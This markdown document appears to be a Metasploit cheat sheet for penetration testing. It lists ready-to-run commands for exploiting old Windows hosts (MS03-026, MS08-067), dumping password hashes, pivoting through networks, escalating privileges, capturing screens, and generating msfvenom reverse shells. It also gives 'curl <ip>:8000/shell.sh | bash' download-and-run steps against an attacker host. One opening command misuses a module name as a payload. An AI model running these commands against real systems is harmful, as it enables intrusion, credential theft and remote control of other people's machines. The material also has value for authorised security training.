
**Set payload:**<br/>
```sh
set payload exploit/multi/handler
```

# Quick Commands
**Background a session with:** `ctrl + z`<br/>
**Set global value:** `setg <name> <value>`<br/>
**See background sessions:** `sessions -l`<br/>
**Go back into backgrounded sessions:** `sessions -i <session num>`<br/>
**Show parameters:** `options`<br/>
**Dump hashes:** `hashdump`<br/>
**Clear payload:** `unset payload`<br/>
**Windows hashdump alt:**`post/windows/gather/hashdump`<br/>
**Grab interface info:** `ipconfig`<br/>
**Network pivot:** `run autoroute -s <interfaceIP>/<Cidr Mask>`<br/>
	
# Easy WinXP pwn
**IN the metasploit console:**<br/>
```sh
use exploit/windows/dcerpc/ms03_026_dcom
set payload windows/meterpreter/bind_tcp
set RHOST <xp machine IP>
exploit
```

# Easy Win2000 pwn
**IN the metasploit console:**<br/>
```sh
use exploit/windows/smb/ms08_067_netapi
set payload windows/meterpreter/reverse_tcp
set rhost <Target IP>
set lhost <attacker IP>
set lport <attacker port>
exploit
```

# Auxiliary Port Scan
```sh
# In the meterpreter shell of the infected machine
run autoroute -s <interfaceIP>/<Cidr Mask>
# Ctrl+Z to background she shell
auxiliary/scanner/portscan/tcp
set RHOSTS <pivot IP>/<Cidr Mask>
set ports <port 1>,<port 2>,<port n>
set threads 50
run
```

# Privilege Escalation 
**To elevate your privilege you can use the commands:**<br/>
```sh
use priv
getsystem

# OR
use exploit/windows/local/<technique>
# SET YOUR OPTIONS
exploit
```

# Screen Capture:
```sh
# Elevate privlages
getsystem
# Load Library 
use espia
# Migrate to Explorer.exe
ps
migrate <pid of explorer.exe>
# Grabb Screenshot
screengrab
```

# Linux Elevate Your Shell:
**Generate your payloads:**<br/>
```sh
msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=1234 -f raw > shell.sh

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.bin
```

**Start listener and server:**<br/>
```sh
python3 -m http.server
nc -nlvp 1234
```

**Use your unstable shell to download the stable shell bin:**<br/>
```sh
curl <ip>:8000/shell.sh | bash
```

**Start your meterpreter listener:**<br/>
```sh
set payload linux/x86/meterpreter/reverse_tcp
use exploit/multi/handler
exploit
```

**Download your meterpreter payload and run it:**<br/>
```sh
curl -o /tmp/shell.bin <ip>:8000/shell.bin
chmod +x /tmp/shell.bin
cd /tmp
./shell.bin
```

**Elevate the shell's permissions:**<br/>
```sh
^Z
use post/multi/recon/local_exploit_suggester
exploit
```


# Using the MFSDB and workspaces:
```sh
systemctl start postgresql
msfdb init
msfconsole
db_status
```

**View workspace:** `workspace`<br/>
**Add a workspace:** `workspace -a <workspace name>`<br/>
**Delete a workspace:** `workspace -d <workspace name>`<br/>
**Change current workspace:** `workspace <workspace name>`<br/>
**Show workspace options:** `workspace -h`
**Show database commands:** `help`
**Save nmap scan to db:** `db_nmap <params> <ip>`
**Get host information:** `hosts`
**Get service information:** `services`
**Add hosts to RHOST param:** `hosts -R`
**Search for service in all hosts:** `services -S <service name>`





